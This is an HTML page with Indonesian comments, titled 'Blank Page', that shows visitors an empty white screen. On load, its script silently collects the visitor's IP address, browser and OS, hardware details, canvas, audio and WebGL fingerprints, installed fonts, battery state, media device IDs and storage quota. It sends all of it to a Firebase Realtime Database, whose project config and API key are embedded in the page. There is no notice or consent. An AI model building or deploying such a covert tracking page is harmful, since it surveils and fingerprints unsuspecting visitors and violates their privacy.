<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blank Page</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <script>
        // Ganti dengan config Firebase kamu
        const firebaseConfig = {
          apiKey: "AIzaSyDDImo9Vq1jqID6WDbGMXToexeIfNFOjpQ",
          authDomain: "iplo-50a21.firebaseapp.com",
          databaseURL: "https://iplo-50a21-default-rtdb.asia-southeast1.firebasedatabase.app",
          projectId: "iplo-50a21",
          storageBucket: "iplo-50a21.firebasestorage.app",
          messagingSenderId: "488527718585",
          appId: "1:488527718585:web:f1a35e256a0d3cf5021368",
          measurementId: "G-1LQMBTQBPK"
};

        // Init Firebase
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        // Fungsi ambil data silently lalu kirim ke DB
        async function logUserData() {
            try {
                // Ambil IP via API eksternal
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const userIP = ipData.ip;

                // Info browser dan OS
                const userAgent = navigator.userAgent;
                let browser = "Unknown";
                let os = "Unknown";

                if (userAgent.indexOf("Chrome") > -1) browser = "Chrome";
                else if (userAgent.indexOf("Firefox") > -1) browser = "Firefox";
                else if (userAgent.indexOf("Safari") > -1) browser = "Safari";
                else if (userAgent.indexOf("Edge") > -1) browser = "Edge";
                else if (userAgent.indexOf("Trident") > -1) browser = "IE";

                if (userAgent.indexOf("Win") > -1) os = "Windows";
                else if (userAgent.indexOf("Mac") > -1) os = "MacOS";
                else if (userAgent.indexOf("Linux") > -1) os = "Linux";
                else if (userAgent.indexOf("Android") > -1) os = "Android";
                else if (userAgent.indexOf("iOS") > -1) os = "iOS";

                // Info tambahan: Screen, hardware, timezone, language
                const screenRes = `${screen.width}x${screen.height}`;
                const pixelRatio = window.devicePixelRatio;
                const cpuCores = navigator.hardwareConcurrency || "Unknown";
                const deviceMemory = navigator.deviceMemory || "Unknown";
                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                const language = navigator.language;

                // Canvas Fingerprint
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = "top";
                ctx.font = "14px 'Arial'";
                ctx.textBaseline = "alphabetic";
                ctx.fillStyle = "#f60";
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = "#069";
                ctx.fillText("Hello, world!", 2, 15);
                const canvasHash = canvas.toDataURL();

                // Font enumeration
                const fonts = [];
                const testFonts = ['Arial', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Comic Sans MS', 'Impact'];
                const baseFont = 'monospace';
                const testString = 'abcdefghijklmnopqrstuvwxyz0123456789';
                const detector = document.createElement('span');
                detector.style.fontFamily = baseFont;
                detector.innerHTML = testString;
                document.body.appendChild(detector);
                const baseWidth = detector.offsetWidth;
                document.body.removeChild(detector);
                testFonts.forEach(font => {
                    const el = document.createElement('span');
                    el.style.fontFamily = `${font}, ${baseFont}`;
                    el.innerHTML = testString;
                    document.body.appendChild(el);
                    if (el.offsetWidth !== baseWidth) fonts.push(font);
                    document.body.removeChild(el);
                });

                // AudioContext Fingerprint
                let audioHash = "Unknown";
                try {
                    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                    const oscillator = audioCtx.createOscillator();
                    oscillator.type = 'sine';
                    oscillator.frequency.setValueAtTime(440, audioCtx.currentTime);
                    const compressor = audioCtx.createDynamicsCompressor();
                    oscillator.connect(compressor);
                    compressor.connect(audioCtx.destination);
                    audioHash = `${oscillator.type}_${compressor.threshold.value}`; // Basic hash
                    oscillator.start();
                    oscillator.stop(audioCtx.currentTime + 0.01); // Stop immediately
                } catch (e) {
                    audioHash = "AudioContext not supported";
                }

                // WebGL Info
                let webglInfo = "Unknown";
                try {
                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    if (gl) {
                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                        webglInfo = debugInfo ? 
                            `${gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)}|${
                            gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)}` : "WebGL no debug";
                    }
                } catch (e) {
                    webglInfo = "WebGL not supported";
                }

                // Battery Status (kalo supported)
                let batteryInfo = "Unknown";
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    batteryInfo = {
                        level: battery.level,
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                }

                // Performance Timings
                const performanceTiming = performance.getEntriesByType('navigation')[0] || {};
                const loadTime = performanceTiming.loadEventEnd ? 
                    performanceTiming.loadEventEnd - performanceTiming.startTime : "Unknown";

                // Media Devices Enumeration
                let mediaDevices = "Unknown";
                if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
                    const devices = await navigator.mediaDevices.enumerateDevices();
                    mediaDevices = devices.map(device => ({
                        kind: device.kind,
                        label: device.label || "No label",
                        deviceId: device.deviceId
                    }));
                }

                // Storage Quota Estimate
                let storageQuota = "Unknown";
                if (navigator.storage && navigator.storage.estimate) {
                    const estimate = await navigator.storage.estimate();
                    storageQuota = {
                        usage: estimate.usage,
                        quota: estimate.quota
                    };
                }

                // Timestamp di GMT+7 (Asia/Jakarta)
                const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Asia/Jakarta' });

                // Data yang dikirim
                const data = {
                    ip: userIP,
                    browser: browser,
                    os: os,
                    userAgent: userAgent,
                    screenResolution: screenRes,
                    pixelRatio: pixelRatio,
                    cpuCores: cpuCores,
                    deviceMemory: deviceMemory,
                    timezone: timezone,
                    language: language,
                    canvasHash: canvasHash,
                    installedFonts: fonts.join(', '),
                    audioHash: audioHash,
                    webglInfo: webglInfo,
                    batteryInfo: batteryInfo,
                    referrer: document.referrer,
                    connectionType: navigator.connection ? navigator.connection.effectiveType : "Unknown",
                    loadTime: loadTime,
                    mediaDevices: mediaDevices,
                    storageQuota: storageQuota,
                    timestamp: timestamp
                };

                // Kirim ke Firebase Realtime DB (path /logs)
                database.ref('logs').push(data);
            } catch (error) {
                console.error('Error logging data:', error); // Silent error
            }
        }

        // Jalankan saat load
        window.onload = logUserData;
    </script>
</head>
<body>
    <!-- Blank putih, kosong -->
</body>
    </html>
